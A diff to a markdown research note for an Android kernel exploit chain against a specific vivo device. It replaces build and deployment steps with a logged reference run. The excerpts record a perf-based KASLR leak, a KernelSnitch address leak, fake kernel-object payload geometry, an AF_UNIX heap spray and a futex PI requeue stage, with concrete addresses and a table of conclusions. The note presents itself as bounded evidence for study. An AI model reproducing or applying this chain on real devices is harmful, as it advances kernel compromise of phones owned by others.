@@ -1,27 +1,75 @@
-# 01. Observation entry, log capture, and evidence boundary
+# 01. Empirical record and conclusion boundary
 
-This document describes the observable path in the current 3.1 package. It is not a post-route exploitation guide and it should not be used on non-target devices. The focus is how to capture, read, and limit the probe logs.
+## Abstract
 
-This package does not ship a prebuilt binary, external context copies, full console logs, logcat captures, dmesg files, or tombstones. The snippets below describe field formats; research conclusions must be collected again on the exact target firmware.
+This file records empirical evidence up to the 3.1 endpoint and defines the public conclusion boundary. Every conclusion below is supported either by visible log evidence or by the current source boundary. Technical material after 3.1 is intentionally excluded.
 
-## Entry and log sources
+## Material note
 
-Build:
+The reference run used a local trimmed artifact whose logs include `preload starting`, `direct-demo`, `startup context`, and `build config`. The current public source uses `probe loader`, `probe supervisor`, `probe context`, and `probe build`. This is a naming difference; the field-level evidence is read from the key/value logs.
 
-```bash
-cd exploit
-make probe PROJECT=PD2314-AP3A.240905.015.A2 API=35
-sha256sum build/PD2314-AP3A.240905.015.A2/bin/probe.so
+| Reference log name | Current source name | Meaning |
+| --- | --- | --- |
+| `preload starting` | `probe loader starting` | `LD_PRELOAD` constructor entered |
+| `direct-demo supervisor` | `probe supervisor` | supervisor started a worker |
+| `direct-demo profile applied` | `probe profile applied` | target profile and defaults applied |
+| `startup context` | `probe context` | shell identity and SELinux context |
+| `build config` | `probe build` | build label and 3.1 observation path |
+
+## Empirical excerpt
+
+The following excerpt covers only observations at and before 3.1:
+
+```text
+[+] preload starting pid=23916
+[*] direct-demo supervisor attempt=1/3
+[+] direct-demo profile applied target=vivo_pd2314_mt6896z_5.10.233_sp_2026-05-01 defaults=28
+[+] startup context pid=23917 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] build config pid=23917 label=pd2314_a_15_2_17_1_w10 slide=pselect main=pselect
+[*] perf probe policy paranoid=-1
+[*] perf probe open fd=3 errno=0 attr_size=136
+[*] perf probe ring head=32752 tail=32752 records=2047 samples=2047 kernel=2047 lost=0 malformed=0
+[*] perf probe sampled duration_ms=200 disable=0/0 min=ffffffe778d67770 max=ffffffe77ba02c5c
+[*] perf probe candidate page=ffffffe779e00000 window=2044/2047 near=999 far=887 buckets=8
+[+] perf probe text-base=ffffffe779e00000 min_kip=ffffffe778d67770 samples=2047
+[+] slide-kaslr-perf-ok pid=23917 base=ffffffe779e00000 slide=0000002771e00000
+[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
+[*] kernelsnitch collision-scan found=7/7 elapsed_ms=2220
+[*] kernelsnitch collision-scan leaked mm=ffffff8165295640
+[*] tcp payload geometry slab_base=ffffff8165290000 payload_base=ffffff8165290000 payload_bias=0xe80 fake_lock=ffffff8165291350 fake_w0=ffffff8165292220 fake_task=ffffff8165295800 fake_fops=ffffff8165291000
+[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff8165291000
+[*] af_unix order3 staged pairs=64 requested=64
+[*] sk_buff pcp send ret=65536 errno=0
+[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
+[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
+[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 target=x28+0x38 value=ffffff8165291370 final_fops=1 full_waiter=0 overlay=marker
+[*] slide final tree parent=ffffff8002c84ea0 right=ffffff8165291000 left=0 pi_write=1
+[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
+[*] slide ip side effect calls=1 sched_ok=1
+00002771e00000 route_done=1
+uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
 ```
 
-Push and verify:
+## Conclusion table
 
-```bash
-adb push build/PD2314-AP3A.240905.015.A2/bin/probe.so /data/local/tmp/probe.so
-adb shell sha256sum /data/local/tmp/probe.so
-```
+| ID | Conclusion | Evidence | Boundary |
+| --- | --- | --- | --- |
+| C1 | The target process entered the observation path as shell | `uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1` | no privilege-state claim |
+| C2 | perf sampling was available in this run | `paranoid=-1`, `open fd=3 errno=0`, `kernel=2047 lost=0 malformed=0` | only this run's environment |
+| C3 | KASLR text base was accepted by the voting window | `candidate page=... window=2044/2047`, `slide-kaslr-perf-ok` | address is not stable across boots |
+| C4 | KernelSnitch/mm collision returned a usable address | `found=7/7`, `leaked mm=ffffff8165295640` | not proof that the payload was consumed by the kernel |
+| C5 | user-space payload geometry was internally consistent | `final payload invariant ok` | not proof that the target slot was modified |
+| C6 | spray count completed | `sent=4096 requested=4096` | not standalone hit proof |
+| C7 | futex PI requeue and scheduler-side effect appeared | `errno=35`, `sched_ok=1` | no post-3.1 state claim |
+| C8 | the 3.1 endpoint was reached | `route_done=1` | public conclusion ends here |
 
-Recommended capture:
+## Source boundary
+
+The current public `refclone_run_probe()` includes an ashmem fops restoration attempt after `rc_run_main_route_threads()` and then prints `route-summary`. That is a source-level boundary statement. The public conclusion still rests on the 3.1 log evidence and does not promote later-stage material into this repository.
+
+## Capture requirements
+
+At minimum, keep:
 
 ```bash
 adb logcat -b all -v threadtime > logcat-live.txt
@@ -30,92 +78,4 @@ adb shell getprop ro.boot.bootreason
 adb shell dmesg > dmesg-after.txt
 ```
 
-`probe.so` prints `pr_*` logs to stdout by default. The supervisor calls `set_unbuffer()`, so `tee` preserves stage order. logcat complements stdout with system events, panic/watchdog hints, and reboot evidence. `dmesg` may be permission-limited from shell; record the result anyway.
-
-## Execution order
-
-1. `src/preload.c` sees `Z_REFCLONE=1`, prints `probe loader starting`, and enters `run_probe()`.
-2. `targets/.../main.c` confirms probe mode and calls `refclone_load()`.
-3. The supervisor forks up to three workers and sets `PROBE_WORKER=1`, `PROBE_ATTEMPT=N`, and the current `LD_PRELOAD`.
-4. The worker clears its own `LD_PRELOAD`, then checks the fingerprint and kernel release.
-5. The worker sets three defaults: `PAGE_PREP_SLABS=16`, `PROCESS_VM_CONSUMER_MAX_CALLS=1`, and `SLIDE_IP_ROUTE_ATTEMPTS=1`.
-6. `refclone_run_probe()` runs perf KASLR, mm/slab positioning, payload preparation and spray, futex/rt_mutex route, restore, and `route-summary`.
-
-Older local trimmed builds may print `preload starting`, `direct-demo supervisor`, or `startup context`. The current cleaned package uses `probe loader`, `probe supervisor`, and `probe context`; the field meanings are the same, and this documentation follows the current names.
-
-## Key log skeleton
-
-```text
-[+] probe loader starting pid=...
-[*] probe supervisor attempt=1/3
-[+] probe worker starting pid=...
-[+] probe profile applied target=... defaults=3
-[+] probe context pid=... uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0
-[+] probe build pid=... label=pd2314_a_15_2_17_1_w10 route=perf-kaslr+refclone
-[*] perf probe policy paranoid=...
-[*] perf probe ring head=... tail=... records=... samples=... kernel=... lost=... malformed=...
-[*] perf probe sampled duration_ms=200 disable=0/0 min=... max=...
-[*] perf probe candidate page=... window=.../... near=... far=... buckets=...
-[+] slide-kaslr-perf-ok pid=... base=... slide=...
-[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
-[*] kernelsnitch waiters=... target=... baseline=... threshold=... margin=4 elapsed_ms=...
-[*] kernelsnitch collision-scan found=.../... elapsed_ms=...
-[*] kernelsnitch collision-scan leaked mm=...
-[*] tcp payload geometry slab_base=... payload_bias=0xe80 fake_lock=... fake_w0=... fake_task=... fake_fops=...
-[+] final payload invariant ok mode=active-final target=... value=...
-[*] af_unix order3 staged pairs=64 requested=64
-[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
-[*] main FUTEX_CMP_REQUEUE_PI ret=... errno=...
-[*] slide ip enter fd=... attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 ...
-[*] slide ip seq=1 ret=... errno=... calls=1 sched_ok=1
-[*] slide ip side effect calls=1 sched_ok=1
-[*] misc.fops restore target=... original=... ret=8 errno=0
-[+] misc.fops restored to ashmem_fops — ashmem safe
-[+] route-summary pid=... kaslr=1 base=... slide=... route_done=1
-uid=2000(shell) gid=2000(shell) ...
-```
-
-One reference run showed `records=2047 samples=2047 kernel=2047 lost=0 malformed=0`, `window=2044/2047`, KernelSnitch `found=7/7`, spray `sent=4096 requested=4096`, and route-side `sched_ok=1`. Those values indicate a high-quality observation for that run, but they do not replace fresh logs from the current device.
-
-## Field meanings
-
-| Field | Source | Meaning |
-| --- | --- | --- |
-| `attr=u:r:shell:s0` | `log_startup_context()` | SELinux context; it does not imply a privilege change |
-| `route=perf-kaslr+refclone` | `probe build` | Internal source label for the selected observation path |
-| `base` / `slide` | perf probe | live kernel text base and offset from `KIMAGE_TEXT_BASE` |
-| `leaked mm` | KernelSnitch | `mm_struct`-near address returned after collision search |
-| `slab_base` | `leaked & ~0x7fff` | estimated order-3 slab page base |
-| `payload_bias=0xe80` | payload geometry | expected sk_buff copy landing bias |
-| `final payload invariant ok` | user-space payload check | both 32 KiB chunks are internally consistent; not proof of kernel placement |
-| `sched_ok=1` | consumer thread | at least one `sched_setattr` call on the waiter tid succeeded |
-| `ret=8 errno=0` | restore | an 8-byte writeback to `dashmem_misc.fops` completed |
-| `route_done=1` | worker summary | thread path reached the endpoint; not standalone vulnerability proof |
-
-## Evidence ladder
-
-| Conclusion level | Required correlated logs |
-| --- | --- |
-| Entry is valid | `probe loader starting`, `probe worker starting`, and target profile accepted |
-| KASLR observation is valid | `perf probe ring` has kernel samples, candidate page accepted, `slide-kaslr-perf-ok` printed |
-| slab observation is valid | `prepare_kernel_page geom` and `kernelsnitch collision-scan leaked mm` both printed |
-| payload preparation is valid | payload geometry and `final payload invariant ok` both printed |
-| route-side side effect appeared | `FUTEX_CMP_REQUEUE_PI`, `slide ip seq`, and `slide ip side effect ... sched_ok=1` all printed |
-| strongest 3.1 closure | all above, plus restore `ret=8 errno=0` and `route-summary kaslr=1 route_done=1` |
-
-`route-summary` is an endpoint marker, not the conclusion itself. Without restore, the log only supports that execution reached near the route end. If only toybox `id` prints `uid=2000(shell)`, that is just the host process identity and does not indicate privilege escalation.
-
-## Failure mapping
-
-| Symptom | Likely location | Handling |
-| --- | --- | --- |
-| fingerprint/kernel mismatch | target gate | Stop; do not force constants onto another firmware |
-| `perf probe open errno` | perf policy or permission | Record `paranoid`, `attr_size`, and errno; KASLR evidence is absent |
-| `no usable kernel samples` | sample quality | Retest with a small `PERF_PROBE_MSEC` adjustment |
-| `rejected histogram` | base candidate not concentrated | Save ring statistics; do not hand-force a live base |
-| `only found ... collisions` | KernelSnitch collision shortage | supervisor retry raises `PAGE_PREP_SLABS` to 32 |
-| spray `sent` below `requested` | AF_UNIX/sk_buff pressure | Record first failure `ret/errno`; downgrade later-stage evidence |
-| restore `ret != 8` | writeback closure failed | Save stdout/logcat/dmesg and prepare for device recovery |
-| hang or reboot | kernel panic/watchdog | Long-press volume-down plus power, then collect bootreason and available dmesg |
-
-Reboot, panic, watchdog, or long unresponsiveness are test risks accepted by the operator. On the exact target owned by the tester, the current package does not persist or install a resident privileged stage, so permanent damage should not normally occur, but important data should still be backed up first.
+Reboot, panic, watchdog, or long unresponsiveness are test risks accepted by the operator. Confirm device and data recoverability before testing.
